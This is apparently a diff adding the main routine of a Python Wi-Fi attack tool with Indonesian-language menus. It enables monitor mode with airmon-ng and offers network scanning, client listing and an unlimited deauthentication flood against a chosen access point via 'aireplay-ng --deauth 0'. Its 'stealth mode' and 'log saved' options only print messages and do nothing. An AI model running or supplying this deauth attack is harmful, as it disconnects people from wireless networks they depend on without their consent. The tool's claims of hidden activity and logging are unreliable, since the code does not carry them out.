+    wlan_pattern = re.compile("^wlan[0-9]+")
+    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
+    if len(check_wifi_result) == 0:
+        print(f"{Fore.RED}[ERROR] Tidak ada adaptor Wi-Fi yang terhubung.")
+        exit()
+
+    # Pilih antarmuka Wi-Fi
+    print(f"{Fore.YELLOW}Antarmuka Wi-Fi tersedia:")
+    for index, interface in enumerate(check_wifi_result):
+        print(f"{index} - {interface}")
+    while True:
+        choice = input(f"{Fore.YELLOW}Pilih antarmuka Wi-Fi: ")
+        try:
+            selected_interface = check_wifi_result[int(choice)]
+            break
+        except (IndexError, ValueError):
+            print(f"{Fore.RED}[ERROR] Pilihan tidak valid. Silakan coba lagi.")
+
+    # Matikan proses konflik dan aktifkan mode monitor
+    print(f"{Fore.GREEN}[INFO] Mengaktifkan mode monitor...")
+    subprocess.run(["ip", "link", "set", selected_interface, "down"])
+    subprocess.run(["airmon-ng", "check", "kill"])
+    subprocess.run(["iw", selected_interface, "set", "monitor", "none"])
+    subprocess.run(["ip", "link", "set", selected_interface, "up"])
+
+    while True:
+        choice = main_menu()
+        if choice == "1":
+            scan_wireless_networks(selected_interface)
+        elif choice == "2":
+            networks = scan_wireless_networks(selected_interface)
+            target = networks[int(input(f"{Fore.YELLOW}Pilih target Wi-Fi: "))]
+            clients = detect_connected_clients(selected_interface, target["BSSID"])
+            display_connected_clients(clients)
+        elif choice == "3":
+            networks = scan_wireless_networks(selected_interface)
+            target = networks[int(input(f"{Fore.YELLOW}Pilih target Wi-Fi: "))]
+            print(analyze_network_security(target))
+        elif choice == "4":
+            networks = scan_wireless_networks(selected_interface)
+            target = networks[int(input(f"{Fore.YELLOW}Pilih target Wi-Fi: "))]
+            hackbssid = target["BSSID"]
+            hackchannel = target["channel"].strip()
+            subprocess.run(["airmon-ng", "start", selected_interface, hackchannel])
+            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, selected_interface])
+        elif choice == "5":
+            print(f"{Fore.GREEN}[INFO] Mode stealth diaktifkan. Aktivitas disembunyikan.")
+        elif choice == "6":
+            print(f"{Fore.GREEN}[INFO] Log aktivitas disimpan ke file log.txt.")
+        elif choice == "7":
+            print(f"{Fore.YELLOW}Keluar dari program.")
+            exit()
+        else:
+            print(f"{Fore.RED}[ERROR] Pilihan tidak valid. Silakan coba lagi.")
+
+if __name__ == "__main__":
+    main()
